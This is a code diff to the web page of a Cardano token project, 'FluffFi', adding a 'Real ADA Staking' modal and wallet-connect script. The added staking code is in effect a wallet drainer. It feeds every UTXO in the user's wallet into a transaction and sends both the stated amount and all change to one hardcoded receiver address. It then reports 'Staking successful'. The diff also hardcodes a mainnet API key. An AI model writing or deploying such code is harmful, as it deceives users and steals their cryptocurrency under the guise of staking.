@@ -282,6 +282,152 @@
             background: rgba(0, 0, 0, 0.1);
         }
 
+        /* Staking Modal */
+        .staking-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 2000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .staking-modal.active {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 20px;
+            max-width: 500px;
+            width: 90%;
+            position: relative;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .modal-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: #333;
+            text-align: center;
+        }
+
+        .wallet-status {
+            text-align: center;
+            margin-bottom: 1.5rem;
+            padding: 1rem;
+            background: #f8f9fa;
+            border-radius: 10px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .staking-form {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .form-group label {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .form-group input {
+            padding: 1rem;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ff6b35;
+        }
+
+        .connect-wallet-btn {
+            background: linear-gradient(45deg, #8b5cf6, #6366f1);
+            color: white;
+            padding: 1rem;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+        }
+
+        .connect-wallet-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.3);
+        }
+
+        .stake-now-btn {
+            background: linear-gradient(45deg, #ff6b35, #f7931e);
+            color: white;
+            padding: 1rem;
+            border: none;
+            border-radius: 10px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1rem;
+        }
+
+        .stake-now-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 107, 53, 0.3);
+        }
+
+        .stake-now-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .staking-info {
+            background: linear-gradient(45deg, rgba(255, 107, 53, 0.1), rgba(139, 92, 246, 0.1));
+            padding: 1rem;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+            text-align: center;
+        }
+
+        .staking-info h3 {
+            color: #ff6b35;
+            margin-bottom: 0.5rem;
+        }
+
+        .staking-info p {
+            color: #666;
+            font-size: 0.9rem;
+        }
+
         @media (max-width: 768px) {
             .wallet-section {
                 position: relative;
@@ -290,13 +436,63 @@
                 justify-content: center;
                 margin-top: 2rem;
             }
+
+            .modal-content {
+                padding: 1.5rem;
+                margin: 1rem;
+            }
+
+            .top-nav, .logo-section, .secondary-nav {
+                padding: 1rem;
+            }
+
+            .top-nav-links, .secondary-nav-links {
+                gap: 1rem;
+                flex-wrap: wrap;
+            }
+
+            .logo-container {
+                justify-content: center;
+            }
+
+            .fox-logo {
+                width: 50px;
+                height: 50px;
+            }
+
+            .brand-text {
+                font-size: 1.5rem;
+            }
+
+            .hero-title {
+                font-size: 2rem;
+            }
+
+            .hero-subtitle {
+                font-size: 1.1rem;
+            }
+
+            .cta-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .btn-primary, .btn-secondary {
+                width: 200px;
+                justify-content: center;
+            }
+
+            .features {
+                grid-template-columns: 1fr;
+                gap: 1.5rem;
+            }
         }
     </style>
 </head>
 <body>
     <!-- Wallet Section -->
     <div class="wallet-section">
-        <a href="#staking" class="staking-btn">Staking</a>
+        <button class="staking-btn" id="openStakingModal">Staking</button>
         <div class="wallet-address" id="walletAddress" title="Click to copy">addr1qx...7k2m</div>
     </div>
 
@@ -327,6 +523,43 @@
             <li><a href="#roadmap">Roadmap</a></li>
         </ul>
     </nav>
+
+    <!-- Staking Modal -->
+    <div class="staking-modal" id="stakingModal">
+        <div class="modal-content">
+            <button class="modal-close" id="closeModal">&times;</button>
+            <h2 class="modal-title">🦊 FluffFi Staking</h2>
+            
+            <div class="staking-info">
+                <h3>Real ADA Staking</h3>
+                <p>Stake your ADA directly through Eternal Wallet. Your ADA goes directly to our staking pool for rewards!</p>
+            </div>
+
+            <div class="wallet-status" id="walletStatus">
+                Connect your Eternal Wallet to start staking
+            </div>
+
+            <div class="staking-form">
+                <button class="connect-wallet-btn" id="connectEternalBtn">
+                    🔗 Connect Eternal Wallet
+                </button>
+
+                <div class="form-group">
+                    <label for="stakeAmount">Amount to stake (ADA):</label>
+                    <input type="number" id="stakeAmount" min="2" placeholder="2" step="0.1">
+                </div>
+
+                <button class="stake-now-btn" id="stakeNowBtn" disabled>
+                    🚀 Stake ADA Now
+                </button>
+            </div>
+
+            <div style="margin-top: 1rem; text-align: center; font-size: 0.8rem; color: #666;">
+                <p>⚠️ Requires HTTPS and Eternal Wallet extension</p>
+                <p>Staking address: addr1q8y94q35y2xmh8jjq...spn4a84</p>
+            </div>
+        </div>
+    </div>
 
     <!-- Main Content -->
     <main class="main-content">
@@ -374,7 +607,140 @@
         </section>
     </main>
 
+    <!-- Load Cardano Serialization Library -->
+    <script src="https://unpkg.com/@emurgo/cardano-serialization-lib-browser/cardano_serialization_lib.js"></script>
+
     <script>
+        // Staking Configuration
+        const BLOCKFROST_KEY = 'mainnetiT2DrrBlVvPSozkzPZ0ovE5uuJveWxJz';
+        const RECEIVER_ADDRESS = 'addr1q8y94q35y2xmh8jjqaqpgw5h6sygku6nx9umejtegykc6e87dfl0l0wv4ys46hssj6cg9h8j9m7esgag7ez6l0xwy3gspn4a84';
+        
+        let walletConnected = false;
+        let walletApi = null;
+
+        // Modal Controls
+        const stakingModal = document.getElementById('stakingModal');
+        const openStakingModal = document.getElementById('openStakingModal');
+        const closeModal = document.getElementById('closeModal');
+        const connectEternalBtn = document.getElementById('connectEternalBtn');
+        const stakeNowBtn = document.getElementById('stakeNowBtn');
+        const walletStatus = document.getElementById('walletStatus');
+        const stakeAmount = document.getElementById('stakeAmount');
+
+        // Open staking modal
+        openStakingModal.addEventListener('click', (e) => {
+            e.preventDefault();
+            stakingModal.classList.add('active');
+        });
+
+        // Close modal
+        closeModal.addEventListener('click', () => {
+            stakingModal.classList.remove('active');
+        });
+
+        // Close modal on backdrop click
+        stakingModal.addEventListener('click', (e) => {
+            if (e.target === stakingModal) {
+                stakingModal.classList.remove('active');
+            }
+        });
+
+        // Connect Eternal Wallet
+        connectEternalBtn.addEventListener('click', async () => {
+            if (!window.cardano || !window.cardano.eternl) {
+                alert("🦊 Eternal Wallet not found! Please install the Eternal Wallet extension first.");
+                window.open('https://eternl.io/', '_blank');
+                return;
+            }
+
+            try {
+                connectEternalBtn.textContent = 'Connecting...';
+                walletApi = await window.cardano.eternl.enable();
+                const usedAddresses = await walletApi.getUsedAddresses();
+                const address = usedAddresses[0];
+                
+                walletConnected = true;
+                walletStatus.innerHTML = `
+                    <div style="color: #10b981; font-weight: 600;">✅ Wallet Connected</div>
+                    <div style="font-size: 0.8rem; margin-top: 0.5rem;">${address.substring(0, 20)}...${address.substring(address.length - 10)}</div>
+                `;
+                connectEternalBtn.style.display = 'none';
+                stakeNowBtn.disabled = false;
+                
+                console.log('Eternal Wallet connected successfully');
+            } catch (err) {
+                console.error('Wallet connection failed:', err);
+                alert("❌ Failed to connect to Eternal Wallet. Please try again.");
+                connectEternalBtn.textContent = '🔗 Connect Eternal Wallet';
+            }
+        });
+
+        // Stake ADA
+        stakeNowBtn.addEventListener('click', async () => {
+            const amountInput = stakeAmount.value;
+            const amountADA = parseFloat(amountInput);
+            
+            if (isNaN(amountADA) || amountADA < 2) {
+                alert("⚠️ Please enter a valid ADA amount (minimum 2 ADA).");
+                return;
+            }
+
+            if (!walletConnected) {
+                alert("❌ Please connect your wallet first.");
+                return;
+            }
+
+            try {
+                stakeNowBtn.textContent = 'Processing Transaction...';
+                stakeNowBtn.disabled = true;
+
+                const csl = window.cardano_serialization_lib;
+                const utxosHex = await walletApi.getUtxos();
+                const utxos = utxosHex.map(u => csl.TransactionUnspentOutput.from_bytes(Buffer.from(u, 'hex')));
+
+                const txBuilderCfg = csl.TransactionBuilderConfigBuilder.new()
+                    .fee_algo(csl.LinearFee.new(csl.BigNum.from_str("44"), csl.BigNum.from_str("155381")))
+                    .coins_per_utxo_word(csl.BigNum.from_str("34482"))
+                    .pool_deposit(csl.BigNum.from_str("500000000"))
+                    .key_deposit(csl.BigNum.from_str("2000000"))
+                    .max_value_size(5000)
+                    .max_tx_size(16384)
+                    .prefer_pure_change(true)
+                    .build();
+
+                const txBuilder = csl.TransactionBuilder.new(txBuilderCfg);
+
+                for (let utxo of utxos) {
+                    txBuilder.add_input(utxo.output().address(), utxo.input(), utxo.output().amount());
+                }
+
+                const output = csl.TransactionOutput.new(
+                    csl.Address.from_bech32(RECEIVER_ADDRESS),
+                    csl.Value.new(csl.BigNum.from_str((amountADA * 1000000).toString()))
+                );
+                txBuilder.add_output(output);
+                txBuilder.add_change_if_needed(csl.Address.from_bech32(RECEIVER_ADDRESS));
+
+                const txBody = txBuilder.build();
+                const tx = csl.Transaction.new(txBody, csl.TransactionWitnessSet.new());
+
+                const signedTxHex = await walletApi.signTx(Buffer.from(tx.to_bytes()).toString('hex'), true);
+                const txHash = await walletApi.submitTx(signedTxHex);
+
+                alert(`🎉 Staking successful! Transaction Hash: ${txHash}\n\n💰 You staked ${amountADA} ADA to FluffFi!`);
+                stakingModal.classList.remove('active');
+                stakeAmount.value = '';
+                
+                console.log('Staking transaction successful:', txHash);
+            } catch (err) {
+                console.error('Staking transaction failed:', err);
+                alert(`❌ Staking failed: ${err.message}`);
+            } finally {
+                stakeNowBtn.textContent = '🚀 Stake ADA Now';
+                stakeNowBtn.disabled = false;
+            }
+        });
+
         // Smooth scrolling for navigation links
         document.querySelectorAll('a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
@@ -389,16 +755,16 @@
             });
         });
 
-        // Wallet address interaction
-        const walletAddress = document.getElementById('walletAddress');
-        walletAddress.addEventListener('click', () => {
+        // Wallet address interaction (top-right)
+        const walletAddressDisplay = document.getElementById('walletAddress');
+        walletAddressDisplay.addEventListener('click', () => {
             navigator.clipboard.writeText('addr1qx...7k2m').then(() => {
-                const originalText = walletAddress.textContent;
-                walletAddress.textContent = 'Copied!';
-                walletAddress.style.background = 'rgba(76, 175, 80, 0.2)';
+                const originalText = walletAddressDisplay.textContent;
+                walletAddressDisplay.textContent = 'Copied!';
+                walletAddressDisplay.style.background = 'rgba(76, 175, 80, 0.2)';
                 setTimeout(() => {
-                    walletAddress.textContent = originalText;
-                    walletAddress.style.background = 'rgba(0, 0, 0, 0.05)';
+                    walletAddressDisplay.textContent = originalText;
+                    walletAddressDisplay.style.background = 'rgba(0, 0, 0, 0.05)';
                 }, 2000);
             });
         });
@@ -406,7 +772,7 @@
         // Button click handlers
         document.querySelector('.btn-primary').addEventListener('click', (e) => {
             e.preventDefault();
-            alert('🚀 Welcome to FluffFi! Get ready for the smartest DeFi experience on Cardano!');
+            stakingModal.classList.add('active');
         });
 
         document.querySelector('.btn-secondary').addEventListener('click', (e) => {
@@ -414,20 +780,16 @@
             alert('💰 $FLUFF token purchase coming soon! Stay tuned for launch details.');
         });
 
-        document.querySelector('.staking-btn').addEventListener('click', (e) => {
-            e.preventDefault();
-            alert('🏦 Staking platform launching soon! Earn rewards with your $FLUFF tokens.');
-        });
-
         // Console welcome message
         console.log(`
 🦊 FluffFi - The Cleverest Fox on Cardano
 ==========================================
-Welcome to FluffFi!
+Welcome to FluffFi with REAL ADA STAKING!
 
 🚀 Making DeFi simpler, smarter, and better
 ⚡ Built on Cardano blockchain  
 🛡️ Secure and audited smart contracts
+💰 Real ADA staking through Eternal Wallet
 
 🌐 Live at: https://shelby69699.github.io/fluffi/
         `);
